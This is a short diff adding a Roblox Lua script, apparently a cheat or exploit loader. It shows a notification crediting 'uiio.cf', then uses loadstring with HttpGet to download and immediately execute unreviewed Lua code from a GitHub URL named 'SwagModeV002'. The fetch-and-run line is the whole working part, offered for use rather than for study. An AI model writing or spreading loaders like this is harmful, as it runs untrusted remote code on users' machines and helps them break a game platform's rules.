@@ -1,0 +1,7 @@
+game.StarterGui:SetCore("SendNotification", {
+    Title = "uiio.cf";
+    Text = "Script brought to you by uiio!";
+    Icon = "";
+    Duration = "5";
+})
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
